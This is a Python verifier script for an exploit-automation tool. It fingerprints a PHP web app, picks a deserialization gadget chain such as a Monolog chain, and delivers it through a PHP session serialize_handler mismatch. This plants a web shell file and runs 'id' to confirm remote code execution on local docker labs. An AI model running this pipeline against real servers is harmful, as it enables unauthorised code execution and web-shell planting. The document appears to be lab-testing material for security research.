#!/usr/bin/env python3
"""Verifier for gadget_fingerprint.py.

Drives the pipeline: given only a URL, the fingerprinter auto-detects the
target, auto-selects a destructor gadget, emits it, and the session
serialize_handler-mismatch delivery lands `id` (uid=www-data) with NO
operator-specified chain.

Two targets (either or both may run):

  A. shmismatch lab (8105, docker-compose.apache-avenues.yml --profile shmismatch):
     app-banner signature -> builtin DeferredWriter chain. Needs no phpggc.

  B. gfp lab (8135, docker-compose.apache-avenues.yml --profile gfp): exposed
     composer.lock -> monolog/monolog 3.x -> Monolog/FW1. The builtin Monolog
     template needs no phpggc; pass --phpggc <checkout> to force the phpggc
     generator path instead.

A negative control runs on each: fingerprint must NOT select a chain for an
unknown/empty target.

Bring up:
    docker compose -f docker-compose.apache-avenues.yml -p p2s-shmismatch --profile shmismatch up -d --build  # A
    docker compose -f docker-compose.apache-avenues.yml -p p2s-gfp        --profile gfp        up -d --build  # B

Usage:
    python3 -I poc/primitives/tooling/verify_gadget_fingerprint.py
    python3 -I poc/primitives/tooling/verify_gadget_fingerprint.py --only shmismatch
    python3 -I poc/primitives/tooling/verify_gadget_fingerprint.py --only gfp --phpggc /tmp/phpggc

Run under `python3 -I`. Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import gadget_fingerprint as gf   # noqa: E402

SHELL = "p2s_gfp_shell.php"

TARGETS = {
    "shmismatch": {"host": "127.0.0.1", "port": 8105,
                   "container": "php2shell-shmismatch-8105",
                   "expect_template": "deferredwriter"},
    "gfp": {"host": "127.0.0.1", "port": 8135,
            "container": "p2s-a4-gfp-8135",
            "expect_template": "monolog_fw1"},
}


def log(m):
    print(m, flush=True)


from common.labharness import container_up  # noqa: E402


def reset(container):
    subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         f"rm -f /var/www/sess/sess_* /var/www/html/{SHELL} /var/sess/sess_* "
         "2>/dev/null; true"],
        check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def run_target(key, phpggc, local_php):
    cfg = TARGETS[key]
    log(f"\n######## {key} lab  http://{cfg['host']}:{cfg['port']} ########")

    # 1) negative control: a path with no fingerprint signal selects nothing.
    log("-- control: fingerprint a signal-less path -> MUST select no chain")
    fp = gf.fingerprint(cfg["host"], cfg["port"], log)
    # strip signals to simulate an unknown target (empty fingerprint)
    empty = {"packages": {}, "signatures": [], "banner": "", "headers": "",
             "sources": []}
    sel_none = gf.select_chain(empty, log)
    control_ok = sel_none is None
    log(f"   control -> {'PASS' if control_ok else 'FAIL'} "
        f"(selected {sel_none})")

    # 2) real selection from the live fingerprint
    log("-- auto: fingerprint live target -> auto-select -> deliver -> id")
    sel = gf.select_chain(fp, log)
    if not sel:
        log("   [FAIL] no chain auto-selected from the live fingerprint")
        return False, control_ok
    tmpl = sel.get("template") or sel.get("preset")
    log(f"   auto-selected: {tmpl} (source={sel['source']}, "
        f"confidence={sel['confidence']})")

    reset(cfg["container"])
    ok, hit, sel2 = gf.run(cfg["host"], cfg["port"], shell_name=SHELL,
                           cmd="id", race=False, phpggc_dir=phpggc,
                           local_php=local_php, verbose=True)
    uid_ok = ok and "uid=" in (hit or "")
    log(f"   land -> {'PASS' if uid_ok else 'FAIL'} "
        f"(uid line: {(hit or '').strip()!r})")
    return uid_ok, control_ok


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--only", choices=["shmismatch", "gfp"], default=None)
    ap.add_argument("--phpggc", default=None,
                    help="phpggc checkout; forces the phpggc generator for "
                         "gfp (otherwise the builtin Monolog template is used)")
    ap.add_argument("--local-php", action="store_true")
    args = ap.parse_args(argv)

    keys = [args.only] if args.only else ["shmismatch", "gfp"]
    ran = False
    results = {}
    for k in keys:
        if container_up(TARGETS[k]["container"]):
            ran = True
            land, ctrl = run_target(k, args.phpggc, args.local_php)
            results[k] = (land, ctrl)
        else:
            log(f"[skip] {TARGETS[k]['container']} not running "
                f"(bring up the matching docker-compose first)")

    log("\n==== gadget-fingerprint verdict ====")
    if not ran:
        log("  no labs ran -- bring up docker-compose.apache-avenues.yml "
            "--profile shmismatch and/or --profile gfp first.")
        return 2
    allok = True
    for k, (land, ctrl) in results.items():
        log(f"  {k:11s}: land={'PASS' if land else 'FAIL'}  "
            f"control(no-signal->no-chain)={'PASS' if ctrl else 'FAIL'}")
        allok = allok and land and ctrl
    log("  NOTE: auto-fingerprint -> auto-select -> RCE with NO operator chain. "
        "App-level object injection (patched 8.5.12); conditional gates apply.")
    if allok:
        log("  => PASS")
        return 0
    log("  => FAIL -- see above.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
